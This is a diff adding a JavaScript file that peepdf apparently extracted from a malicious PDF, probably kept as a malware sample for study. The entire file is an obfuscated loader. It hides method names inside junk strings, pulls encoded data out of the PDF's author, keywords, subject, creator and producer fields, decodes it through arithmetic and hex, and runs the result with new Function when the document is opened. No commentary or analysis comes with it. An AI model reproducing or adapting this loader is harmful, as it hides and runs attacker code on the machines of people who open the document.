@@ -1,0 +1,103 @@
+// peepdf comment: Javascript code located in object 99 (version 1)
+
+function rhjahahagk() {
+    function asfdferg(input2) {
+        var asdf = Fde(input2);
+        return hex2a(asdf);
+    }
+
+    function dec(input2) {
+        return asfdferg(input2);
+    }
+
+    function fasfwefwaf(strdsfwef) {
+        var dsafsa = "sadfsafdreplaceasdfasdf".substring(8, 15);
+        return strdsfwef[dsafsa](/G/g, ",");
+    }
+
+    function Fde(str) {
+        var set = '';
+        var s = '';
+        var ee = '';
+        str = fasfwefwaf(str);
+        str = str.split(",");
+        for (var i = 0; i < str.length; i++) {
+            ee = str[i] / 3;
+            s = toHexMot(ee);
+            set += asdfqwef(s);
+        }
+        return set;
+    }
+
+    function asdfewawea(sa) {
+        var ses = sa;
+        return ses;
+    }
+    var asfafa = info;
+    var ss = asfafa.author;
+    var hgh = asfafa.keywords;
+
+    function asdfqwef(eds) {
+        var set = '';
+        var s = eds;
+        if (s.length < 2) {
+            set = '0' + asdfewawea(s);
+        } else {
+            set = s;
+        }
+        return set;
+    }
+
+    function toHexMot(adf) {
+        var ret = adf.toString(16);
+        return ret;
+    }
+    var asf3f = info;
+    var ded = asf3f.creator;
+    var ttty = info.subject;
+
+    function asdfwfalskdfjk() {
+        return "rCode";
+    }
+
+    function zdfasdfsdf() {
+        var dsvblhuwfbdj = "sdfsdaffromChasadfsdfasdf".substring(7, 14);
+        var vaslnasfjgbaslgshif = asdfwfalskdfjk();
+        return dsvblhuwfbdj + vaslnasfjgbaslgshif;
+    }
+
+    function dsflgmkoeigjmp() {
+        return String;
+    }
+
+    function dsfanjkgrnij(asd) {
+        var asasdfsadf = dsflgmkoeigjmp();
+        return asasdfsadf[zdfasdfsdf()](asd);
+    }
+
+    function qwaerasdf(asd) {
+        var asdfew = dsfanjkgrnij(asd);
+        return asdfew;
+    }
+
+    function hex2a(hex) {
+        var str = '';
+        var zzz = qwaerasdf;
+        for (var i = 0; i < hex.length; i += 2)
+        str += qwaerasdf('0x' + hex.substr(i, 2));
+        return str;
+    }
+    ss += ttty + hgh;
+    var asdfe = "producer";
+    var dad = asfafa[asdfe];
+
+    function asdfsdf(ded, dad) {
+        return ded + dad;
+    }
+    ss += asdfsdf(ded, dad);
+    var ss = dec(ss);
+    var tmpFunc = new Function(ss);
+    tmpFunc();
+}
+rhjahahagk();
+
